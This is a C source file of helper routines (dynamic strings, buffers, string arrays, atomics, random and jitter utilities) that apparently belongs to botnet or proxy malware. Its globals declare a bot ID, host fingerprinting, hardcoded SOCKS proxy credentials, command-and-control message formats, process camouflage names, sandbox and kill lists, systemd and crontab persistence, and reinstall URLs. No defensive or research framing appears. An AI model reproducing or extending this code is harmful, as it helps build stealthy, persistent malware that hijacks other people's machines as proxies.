/* ds.c — Dynamic string, byte buffer, string array + globals */

#include "bot.h"

/* ======================================================================
   DYNAMIC STRING
   ====================================================================== */

void ds_init(dstr* s) { s->buf = NULL; s->len = 0; s->cap = 0; }

void ds_free(dstr* s) { free(s->buf); s->buf = NULL; s->len = 0; s->cap = 0; }

static void ds_grow(dstr* s, size_t need) {
    char *tmp;
    if (need + 1 <= s->cap) return;
    size_t nc = s->cap ? s->cap * 2 : 32;
    while (nc < need + 1) nc *= 2;
    tmp = (char*)realloc(s->buf, nc);
    if (!tmp) return;
    s->buf = tmp;
    s->cap = nc;
}

void ds_set(dstr* s, const char* str) {
    size_t n = str ? strlen(str) : 0;
    ds_grow(s, n);
    if (n) memcpy(s->buf, str, n);
    s->buf[n] = '\0';
    s->len = n;
}

void ds_setn(dstr* s, const char* str, size_t n) {
    ds_grow(s, n);
    if (n) memcpy(s->buf, str, n);
    s->buf[n] = '\0';
    s->len = n;
}

void ds_cat(dstr* s, const char* str) {
    size_t n = str ? strlen(str) : 0;
    if (!n) return;
    ds_grow(s, s->len + n);
    memcpy(s->buf + s->len, str, n);
    s->len += n;
    s->buf[s->len] = '\0';
}

void ds_catn(dstr* s, const char* str, size_t n) {
    if (!n) return;
    ds_grow(s, s->len + n);
    memcpy(s->buf + s->len, str, n);
    s->len += n;
    s->buf[s->len] = '\0';
}

void ds_catc(dstr* s, char c) {
    ds_grow(s, s->len + 1);
    s->buf[s->len++] = c;
    s->buf[s->len] = '\0';
}

void ds_catds(dstr* s, const dstr* other) {
    if (other->len) ds_catn(s, other->buf, other->len);
}

void ds_clear(dstr* s) {
    if (s->buf) s->buf[0] = '\0';
    s->len = 0;
}

int ds_empty(const dstr* s) { return s->len == 0; }

int ds_eq(const dstr* s, const char* str) {
    if (!str) return s->len == 0;
    return strcmp(ds_cstr(s), str) == 0;
}

int ds_eqds(const dstr* s, const dstr* other) {
    if (s->len != other->len) return 0;
    if (s->len == 0) return 1;
    return memcmp(s->buf, other->buf, s->len) == 0;
}

size_t ds_find(const dstr* s, const char* needle, size_t start) {
    if (start >= s->len) return (size_t)-1;
    const char* p = strstr(s->buf + start, needle);
    if (!p) return (size_t)-1;
    return (size_t)(p - s->buf);
}

dstr ds_sub(const dstr* s, size_t pos, size_t n) {
    dstr r;
    ds_init(&r);
    if (pos >= s->len) return r;
    if (n > s->len - pos) n = s->len - pos;
    ds_setn(&r, s->buf + pos, n);
    return r;
}

char ds_back(const dstr* s) {
    return s->len > 0 ? s->buf[s->len - 1] : '\0';
}

void ds_pop(dstr* s) {
    if (s->len > 0) { s->len--; s->buf[s->len] = '\0'; }
}

dstr ds_from(const char* str) {
    dstr s;
    ds_init(&s);
    ds_set(&s, str);
    return s;
}

/* ======================================================================
   DYNAMIC BYTE ARRAY
   ====================================================================== */

void db_init(dbuf* b) { b->data = NULL; b->len = 0; b->cap = 0; }

void db_free(dbuf* b) { free(b->data); b->data = NULL; b->len = 0; b->cap = 0; }

void db_reserve(dbuf* b, size_t cap) {
    uint8_t *tmp;
    if (cap <= b->cap) return;
    size_t nc = b->cap ? b->cap * 2 : 64;
    while (nc < cap) nc *= 2;
    tmp = (uint8_t*)realloc(b->data, nc);
    if (!tmp) return;
    b->data = tmp;
    b->cap = nc;
}

void db_push(dbuf* b, uint8_t byte) {
    db_reserve(b, b->len + 1);
    b->data[b->len++] = byte;
}

void db_append(dbuf* b, const uint8_t* data, size_t n) {
    db_reserve(b, b->len + n);
    memcpy(b->data + b->len, data, n);
    b->len += n;
}

void db_setn(dbuf* b, const uint8_t* data, size_t n) {
    b->len = 0;
    db_reserve(b, n);
    memcpy(b->data, data, n);
    b->len = n;
}

void db_clear(dbuf* b) { b->len = 0; }

/* ======================================================================
   STRING ARRAY
   ====================================================================== */

void sa_init(strarr* a) { a->items = NULL; a->count = 0; a->cap = 0; }

void sa_free(strarr* a) {
    size_t i;
    for (i = 0; i < a->count; i++) ds_free(&a->items[i]);
    free(a->items);
    a->items = NULL; a->count = 0; a->cap = 0;
}

static void sa_grow(strarr* a) {
    dstr *tmp;
    if (a->count < a->cap) return;
    size_t nc = a->cap ? a->cap * 2 : 8;
    tmp = (dstr*)realloc(a->items, nc * sizeof(dstr));
    if (!tmp) return;
    a->items = tmp;
    a->cap = nc;
}

void sa_push(strarr* a, const char* s) {
    sa_grow(a);
    ds_init(&a->items[a->count]);
    ds_set(&a->items[a->count], s);
    a->count++;
}

void sa_pushds(strarr* a, const dstr* s) {
    sa_push(a, ds_cstr(s));
}

void sa_clear(strarr* a) {
    size_t i;
    for (i = 0; i < a->count; i++) ds_free(&a->items[i]);
    a->count = 0;
}

void sa_shuffle(strarr* a) {
    size_t i;
    for (i = a->count; i > 1; i--) {
        size_t j = urandom_u32() % i;
        /* swap items[i-1] and items[j] */
        dstr tmp = a->items[i-1];
        a->items[i-1] = a->items[j];
        a->items[j] = tmp;
    }
}

void sa_insert(strarr* dst, const strarr* src) {
    size_t i;
    for (i = 0; i < src->count; i++)
        sa_push(dst, ds_cstr(&src->items[i]));
}

/* ======================================================================
   ATOMIC HELPERS (mutex-based, works on all archs)
   ====================================================================== */

pthread_mutex_t g_atomic_mtx = PTHREAD_MUTEX_INITIALIZER;

int at_load(volatile int* p) {
    int v; pthread_mutex_lock(&g_atomic_mtx); v = *p; pthread_mutex_unlock(&g_atomic_mtx); return v;
}
void at_store(volatile int* p, int v) {
    pthread_mutex_lock(&g_atomic_mtx); *p = v; pthread_mutex_unlock(&g_atomic_mtx);
}
int at_inc(volatile int* p) {
    int v; pthread_mutex_lock(&g_atomic_mtx); v = ++(*p); pthread_mutex_unlock(&g_atomic_mtx); return v;
}
int at_dec(volatile int* p) {
    int v; pthread_mutex_lock(&g_atomic_mtx); v = --(*p); pthread_mutex_unlock(&g_atomic_mtx); return v;
}

/* ======================================================================
   GLOBALS
   ====================================================================== */

#ifdef DEBUG
int g_verbose = 0;
#else
int g_verbose = 0;
#endif

dstr g_bot_id, g_arch, g_proc, g_origin;
int64_t g_ram = 0;
int     g_cpu = 0;
double  g_uplink = 0.0;

/* default proxy credentials — patched by setup.py */
const char *default_proxy_user = "vision";
const char *default_proxy_pass = "vision";

dstr g_proxy_user, g_proxy_pass;
pthread_mutex_t g_socks_creds_mtx = PTHREAD_MUTEX_INITIALIZER;

volatile int g_socks_active = 0, g_socks_count = 0, g_socks_stop = 0;
dstr g_active_relay;
pthread_mutex_t g_socks_mtx = PTHREAD_MUTEX_INITIALIZER;
int g_socks_listener_fd = -1;

strarr g_service_addrs;
strarr g_doh_servers, g_doh_fallback, g_resolver_pool;
strarr g_sys_markers, g_proc_filters, g_parent_checks;
strarr g_camo_names;
strarr g_sb_names, g_kill_patterns;

dstr g_speed_test_url, g_dns_json_accept;
dstr g_rc_target, g_store_dir, g_script_label, g_bin_label;
dstr g_unit_path, g_unit_name, g_unit_body, g_tmpl_body, g_sched_expr;
int g_ctrl_fd = -1;
dstr g_env_label, g_cache_loc, g_lock_loc, g_heartbeat_loc;
dstr g_proto_challenge, g_proto_success, g_proto_reg_fmt;
dstr g_proto_ping, g_proto_pong, g_proto_out_fmt, g_proto_err_fmt;
dstr g_proto_stdout_fmt, g_proto_stderr_fmt;
dstr g_proto_exit_err_fmt, g_proto_exit_ok, g_proto_info_fmt;
dstr g_msg_stream_start, g_msg_bg_start, g_msg_persist_start;
dstr g_msg_kill_ack, g_msg_socks_err_fmt, g_msg_socks_start_fmt;
dstr g_msg_socks_stop, g_msg_socks_auth_fmt;
dstr g_shell_bin, g_shell_flag, g_bash_bin;
dstr g_proc_prefix, g_cmdline_suffix;
dstr g_pgrep_bin, g_pgrep_flag, g_dev_null_path;
dstr g_systemctl_bin, g_crontab_bin;
dstr g_fetch_url;
dstr g_fetch_url_resolved;
dstr g_reinstall_url;

/* ======================================================================
   UTILITY FUNCTIONS
   ====================================================================== */

#ifdef DEBUG
void debug_log(const char* fmt, ...) {
    va_list ap;
    if (!g_verbose) return;
    va_start(ap, fmt);
    fprintf(stderr, "[DEBUG] ");
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    va_end(ap);
}
#endif

void urandom_bytes(uint8_t* out, size_t len) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        size_t off = 0;
        while (off < len) {
            ssize_t n = read(fd, out + off, len - off);
            if (n <= 0) break;
            off += (size_t)n;
        }
        close(fd);
        if (off == len) return;
    }
    srand((unsigned)(time(NULL) ^ getpid()));
    { size_t i; for (i = 0; i < len; i++) out[i] = (uint8_t)(rand() & 0xFF); }
}

uint32_t urandom_u32(void) {
    uint32_t v = 0;
    urandom_bytes((uint8_t*)&v, 4);
    return v;
}

static char _itoa_buf[32];
char* int_to_str(int n) { snprintf(_itoa_buf, sizeof(_itoa_buf), "%d", n); return _itoa_buf; }
char* i64_to_str(int64_t n) { snprintf(_itoa_buf, sizeof(_itoa_buf), "%lld", (long long)n); return _itoa_buf; }

void sleep_ms(int ms) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

int jitter_ms(int f, int c) {
    if (c <= f) return f;
    return f + (int)(urandom_u32() % (unsigned)(c - f + 1));
}

void sleep_jitter(int f, int c) { sleep_ms(jitter_ms(f, c)); }

void random_string(char* out, int n) {
    static const char ch[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    int i;
    for (i = 0; i < n; i++) out[i] = ch[urandom_u32() % (sizeof(ch) - 1)];
    out[n] = '\0';
}
